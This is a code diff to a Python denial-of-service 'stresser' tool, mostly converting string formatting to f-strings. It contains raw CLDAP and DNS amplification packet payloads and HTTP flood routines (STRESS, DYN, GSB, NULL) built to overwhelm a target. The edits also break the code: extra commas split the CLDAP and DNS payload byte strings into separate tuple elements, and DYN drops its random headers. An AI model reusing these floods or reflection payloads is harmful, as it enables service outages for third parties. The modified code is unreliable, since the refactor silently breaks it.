@@ -134,7 +134,7 @@ class Tools:
             suffix = MULTIPLES[multiple].format("i" if binary else "")
             return f"{value:.{precision}f} {suffix}"
         else:
-            return f"-- B"
+            return "-- B"
 
     @staticmethod
     def humanformat(num: int, precision: int = 2):
@@ -307,8 +307,9 @@ class Layer4(Thread):
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
+            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00',
+                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                                 389)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
@@ -330,8 +331,9 @@ class Layer4(Thread):
             self._amp_payloads = cycle(self._generate_amp())
         if name == "DNS":
             self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
+                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00',
+                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+                53)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
 
@@ -575,7 +577,7 @@ class HttpFlood(Thread):
 
     def generate_payload(self, other: str = None) -> bytes:
         return str.encode((self._payload +
-                           "Host: %s\r\n" % self._target.authority +
+                           f"Host: {self._target.authority}\r\n" +
                            self.randHeadercontent +
                            (other if other else "") +
                            "\r\n"))
@@ -627,7 +629,7 @@ class HttpFlood(Thread):
 
     def STRESS(self) -> None:
         payload: bytes = self.generate_payload(
-            (f"Content-Length: 524\r\n"
+            ("Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
@@ -803,8 +805,7 @@ class HttpFlood(Thread):
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
-                                          "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
-                                          self.randHeadercontent +
+                                           f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                           "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -848,10 +849,8 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
-                                                           self._target.raw_path_qs,
-                                                           ProxyTools.Random.rand_str(6)) +
-                             "Host: %s\r\n" % self._target.authority +
+        payload = str.encode(f"{self._req_type} {self._target.raw_path_qs}?qs={ProxyTools.Random.rand_str(6)} HTTP/1.1\r\n" +
+                             f"Host: {self._target.authority}\r\n" +
                              self.randHeadercontent +
                              'Accept-Encoding: gzip, deflate, br\r\n'
                              'Accept-Language: en-US,en;q=0.9\r\n'
@@ -872,7 +871,7 @@ class HttpFlood(Thread):
 
     def NULL(self) -> None:
         payload: Any = str.encode(self._payload +
-                                          "Host: %s\r\n" % self._target.authority +
+                                          f"Host: {self._target.authority}\r\n" +
                                           "User-Agent: null\r\n" +
                                           "Referrer: null\r\n" +
                                           self.SpoofIP + "\r\n")
@@ -949,7 +948,7 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (
                     self._defaultpayload +
-                    "Host: %s\r\n\r\n" % self._target.authority).encode()
+                    f"Host: {self._target.authority}\r\n\r\n").encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
@@ -992,8 +991,7 @@ class ProxyManager:
                         data.splitlines(), proxy_type):
                     proxes.add(proxy)
             except Exception as e:
-                logger.error('Download Proxy Error: %s' %
-                             (e.__str__() or e.__repr__()))
+                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
         return proxes
 
 
@@ -1009,7 +1007,7 @@ class ToolsConsole:
 
     @staticmethod
     def runConsole():
-        cons = "%s@BetterStresser:~#" % gethostname()
+        cons = f"{gethostname()}@BetterStresser:~#"
 
         while 1:
             cmd = input(cons + " ").strip()
@@ -1036,7 +1034,7 @@ class ToolsConsole:
                 continue
 
             if not {cmd} & ToolsConsole.METHODS:
-                print("%s command not found" % cmd)
+                print(f"{cmd} command not found")
                 continue
 
             if cmd == "DSTAT":
@@ -1150,8 +1148,8 @@ class ToolsConsole:
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.ts_srv(domain)
-                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
-                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))
+                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
+                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
 
             if cmd == "PING":
                 while True:
